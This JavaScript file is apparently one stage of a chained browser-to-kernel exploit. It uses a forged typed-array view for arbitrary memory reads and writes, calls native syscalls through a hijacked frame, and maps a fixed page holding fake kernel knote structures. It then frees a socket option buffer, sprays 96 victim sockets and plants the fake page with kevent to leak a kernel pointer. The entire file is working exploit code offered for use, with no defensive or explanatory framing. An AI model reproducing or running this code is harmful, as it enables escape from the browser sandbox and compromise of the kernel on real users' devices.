// Stage D for the Hx1400 browser port: map the fake page and join the
// membership vector.
//
// Consumes window.__fw14StageC from stage_c_race_v1:
//   { kq, dce, targetFd, targetIndex, cand, round, tag, spray, victims,
//     anchor, pid }
//
// Steps (Hx1400 probe() Stage D):
//   1. fake = (dce & 0xffff) << 16 | 0x9800 ; page = fake & ~0x3fff
//      mmap(page, 16384, PROT_READ|WRITE=3, MAP_FIXED|ANON|PRIVATE=0x1012,
//           -1, 0) must return page.
//   2. zero the page and lay out the fake knote/membership fields.
//   3. setsockopt(anchor, 0, 12, &{-6}, 8) then &{-5} to join the anchor.
//   4. free the held target's 248-byte option buffer.
//   5. join all 96 victims with the same level-0/optname-12 pair.
//   6. kevent(kq, {ident=dce, filter=-18, flags=EV_ADD, data=0}) plants the
//      fake page address in the membership vector.
//   7. walk the victims with setsockopt(fd, 0, 72, 12 bytes) and read
//      fake+0x50 (root) and fake+0x38 (refcount). The first victim whose
//      root is a canonical kernel pointer is the leak.
//
// Writes go through the carrier typed array, whose backing pointer is
// redirected through the forged view. The carrier pointer is restored
// after every access. The page is a normal RW user mapping (no W^X).
var result, n, f, dv, saved, phase = "preflight";
var st = null, fake = 0, page = 0, mapped = 0;
var forged = null, carrier = null, carrierSlot = -1, carrierOriginal = null;
var MAPLEN = 16384;
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
      !state || state.array[0] !== state.a || !state.view ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !Number.isInteger(state.index))
    throw new Error("caller_missing");
  st = window.__fw14StageC;
  if (!st || typeof st.kq !== "number" || typeof st.dce !== "number" ||
      typeof st.targetFd !== "number" || !Array.isArray(st.victims) ||
      st.victims.length !== 96 || typeof st.anchor !== "number")
    throw new Error("stage_c_state_missing");
  var need = ["open", "close", "setsockopt", "getsockopt", "kevent", "getpid", "sys477"];
  var missing = [];
  for (var mi = 0; mi < need.length; mi++)
    if (typeof n.wrappers[need[mi]] !== "number") missing.push(need[mi]);
  if (missing.length) throw new Error("wrappers_missing:" + missing.join(","));
  f = n.frame;
  if (f.length < 0x9020) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);
  saved = Array.from(f.subarray(0x200, 0x1000));

  forged = state.view;
  carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  function bytesAt(index, count) {
    var out = [];
    for (var i = 0; i < count; i++) out.push(forged[index + i]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var i = bytes.length - 1; i >= 0; i--)
      value = value * 256 + bytes[i];
    return value;
  }
  function pointerBytes(value) {
    var out = [];
    for (var i = 0; i < 8; i++)
      out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  carrierOriginal = bytesAt(carrierSlot, 8);
  function setCarrier(addr) {
    var next = pointerBytes(addr);
    for (var i = 0; i < 8; i++) forged[carrierSlot + i] = next[i];
  }
  function restoreCarrier() {
    for (var i = 0; i < 8; i++)
      forged[carrierSlot + i] = carrierOriginal[i];
  }
  function poke(addr, bytes) {
    setCarrier(addr);
    for (var i = 0; i < bytes.length; i++) carrier[i] = bytes[i];
    restoreCarrier();
  }
  function peek(addr, count) {
    setCarrier(addr);
    var out = [];
    for (var i = 0; i < count; i++) out.push(carrier[i]);
    restoreCarrier();
    return out;
  }
  function peekLong(addr) { return valueOf(peek(addr, 8)); }
  function peekU32(addr) { return valueOf(peek(addr, 4)); }
  function pokeLong(addr, value) { poke(addr, pointerBytes(value)); }
  function pokeU32(addr, value) {
    poke(addr, [value & 255, (value >>> 8) & 255,
                (value >>> 16) & 255, (value >>> 24) & 255]);
  }
  function pokeU16(addr, value) {
    poke(addr, [value & 255, (value >>> 8) & 255]);
  }
  function isErr(r) {
    return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
  }
  function errnoOf(r) { return isErr(r) ? n.readErrno() : null; }
  function eTag(r) {
    if (!isErr(r)) return "v" + r.value;
    var e = n.readErrno();
    return "e" + (e === null ? r.value : e);
  }
  function mark(m) {
    if (typeof api !== "undefined" && api && typeof api.markSync === "function")
      api.markSync(m);
  }
  function putStr(off, s) {
    for (var i = 0; i < s.length; i++) f[off + i] = s.charCodeAt(i) & 0xff;
    f[off + s.length] = 0;
  }
  function hex8(v) { return ("00000000" + (v >>> 0).toString(16)).slice(-8); }
  function kptr(v) {
    return v !== 0 && Math.floor(v / 0x1000000000000) === 0xffff;
  }

  var pidRes = n.call("getpid", []);
  if (pidRes.high !== 0 || pidRes.value < 1 || pidRes.value > 100000)
    throw new Error("pid_invalid");
  var pid = pidRes.value;

  // ------------------------------------------------------- fake page
  phase = "mmap";
  mark("d_mmap");
  fake = (((st.dce & 0xffff) << 16) | 0x9800) >>> 0;
  page = fake & 0xffffc000;
  mapped = n.call("sys477", [page, MAPLEN, 3, 0x1012, 0xffffffff, 0]);
  var mmapTag = "fake=0x" + hex8(fake) + "/page=0x" + hex8(page) +
    "/rc=" + (isErr(mapped) ? "e" + (errnoOf(mapped) === null ?
      mapped.value : errnoOf(mapped)) : "0x" + hex8(mapped.value));
  if (isErr(mapped) || mapped.value !== page)
    throw new Error("mmap_fixed_" + mmapTag);

  // zero the page
  var zeros = new Uint8Array(MAPLEN);
  poke(page, zeros);

  // fake knote / membership fields, relative to fake
  pokeU32(fake + 16, 0xf9ffffef);
  pokeLong(fake + 24, fake + 512);
  pokeU32(fake + 640, 8);
  pokeLong(fake + 32, fake + 768);
  pokeLong(fake + 800, fake + 1024);
  pokeLong(fake + 1880, fake + 2048);
  pokeLong(fake + 2056, fake + 2304);
  pokeU32(fake + 56, 2);
  pokeLong(fake + 80, 0);
  pokeLong(fake + 88, 0);
  pokeU16(fake + 180, 2);
  pokeU16(fake + 190, 2);

  // join payloads
  f.fill(0, 0x600, 0x680);
  f[0x600] = 0xef; f[0x601] = 0xff; f[0x602] = 0xff; f[0x603] = 0xfa;
  f[0x620] = 0xef; f[0x621] = 0xff; f[0x622] = 0xff; f[0x623] = 0xfb;
  f[0x640] = 0xef; f[0x641] = 0xff; f[0x642] = 0xff; f[0x643] = 0xfb;
  f[0x644] = 0x40; f[0x645] = 0x00; f[0x646] = 0x02; f[0x647] = 0x01;

  function joinAnchor() {
    var a1 = n.call("setsockopt",
      [st.anchor, 0, 12, n.frameAddress + 0x600, 8, 0]);
    if (a1.value !== 0) return "a12" + eTag(a1);
    var a2 = n.call("setsockopt",
      [st.anchor, 0, 12, n.frameAddress + 0x620, 8, 0]);
    if (a2.value !== 0) return "a13" + eTag(a2);
    return "ok";
  }

  phase = "join_anchor";
  mark("d_join_anchor");
  var anchorTag = joinAnchor();
  if (anchorTag !== "ok") throw new Error("anchor_join_" + anchorTag);

  phase = "free_target";
  mark("d_free_target");
  var freeTarget = n.call("setsockopt", [st.targetFd, 41, 51, 0, 0, 0]);
  if (freeTarget.value !== 0) throw new Error("target_free" + eTag(freeTarget));

  phase = "join_victims";
  mark("d_join_victims");
  var joined = 0, joinFail = "";
  for (var vi = 0; vi < st.victims.length; vi++) {
    var j1 = n.call("setsockopt",
      [st.victims[vi], 0, 12, n.frameAddress + 0x600, 8, 0]);
    if (j1.value !== 0) { joinFail = "j12_" + vi + eTag(j1); break; }
    var j2 = n.call("setsockopt",
      [st.victims[vi], 0, 12, n.frameAddress + 0x620, 8, 0]);
    if (j2.value !== 0) { joinFail = "j13_" + vi + eTag(j2); break; }
    joined++;
  }
  if (joined !== 96) throw new Error("joined_" + joined + "_" + joinFail);

  // ------------------------------------------------- plant fake knote
  phase = "arm";
  mark("d_arm");
  function arm(ident, flags, data) {
    f.fill(0, 0x900, 0x940);
    dv.setUint32(0x900, ident >>> 0, true);
    dv.setUint32(0x904, 0, true);
    dv.setInt16(0x908, -18, true);
    dv.setUint16(0x90a, flags, true);
    dv.setInt32(0x910, data, true);
    dv.setInt32(0x914, 0, true);
    return n.call("kevent", [st.kq, n.frameAddress + 0x900, 1, 0, 0, 0]);
  }
  var add = arm(st.dce, 1, 0);
  if (add.value !== 0) throw new Error("leak_ev_add" + eTag(add));

  // ------------------------------------------------------- victim walk
  phase = "leak";
  mark("d_leak");
  var found = -1, kva = 0, count = 0, refMutated = -1, noncanon = "";
  var firstSetErr = "";
  for (var wi = 0; wi < st.victims.length; wi++) {
    var g = n.call("setsockopt",
      [st.victims[wi], 0, 72, n.frameAddress + 0x640, 12, 0]);
    if (g.value !== 0 && !firstSetErr) firstSetErr = "s72@" + wi + eTag(g);
    var root = peekLong(fake + 80);
    var ref = peekU32(fake + 56);
    if (ref !== 2) { refMutated = wi; break; }
    if (kptr(root)) { found = wi; kva = root; count = peekLong(fake + 88); break; }
    if (root !== 0) { noncanon = "tree_" + wi + "_0x" + hex8(root); break; }
  }
  if (found < 0 && refMutated < 0 && !noncanon && firstSetErr)
    noncanon = firstSetErr;

  // ---------------------------------------------------------- outcome
  phase = "outcome";
  for (var ri = 0; ri < saved.length; ri++) f[0x200 + ri] = saved[ri];
  saved = null;
  var post = n.call("getpid", []);
  var intact = post.value === pid && post.high === 0 &&
    state.array[0] === state.a &&
    bytesAt(carrierSlot, 8).join(",") === carrierOriginal.join(",");

  var leakTag = found >= 0 ?
    ("v" + found + "/fd" + st.victims[found] + "/kva=0x" + hex8(kva) +
     "/n=" + count) :
    (refMutated >= 0 ? "refmut@" + refMutated : (noncanon || "none"));

  if (found >= 0) {
    window.__fw14StageD = {
      fake: fake,
      page: page,
      victimIndex: found,
      victimFd: st.victims[found],
      kva: kva,
      count: count,
      kq: st.kq,
      dce: st.dce,
      targetFd: st.targetFd,
      spray: st.spray.slice(),
      victims: st.victims.slice(),
      anchor: st.anchor,
      pid: pid
    };
    result = {
      id: "stage_d_fake_v1",
      status: intact ? "pass" : "fail",
      details: {
        pid: pid,
        mmap: mmapTag,
        anchor: anchorTag,
        joined: joined,
        leak: leakTag,
        state: "held",
        intact: intact
      }
    };
  } else {
    result = {
      id: "stage_d_fake_v1",
      status: "fail",
      details: {
        pid: pid,
        mmap: mmapTag,
        anchor: anchorTag,
        joined: joined,
        leak: leakTag,
        state: "failed",
        intact: intact
      }
    };
  }
} catch (e) {
  result = {
    id: "stage_d_fake_v1",
    status: "error",
    details: { phase: phase, error: String(e).slice(0, 220) }
  };
} finally {
  try { if (forged && carrierSlot >= 0 && carrierOriginal)
    for (var ci = 0; ci < 8; ci++)
      forged[carrierSlot + ci] = carrierOriginal[ci]; } catch (ignore) {}
  if (f && saved)
    for (var fi = 0; fi < saved.length; fi++) f[0x200 + fi] = saved[fi];
}
return [result];
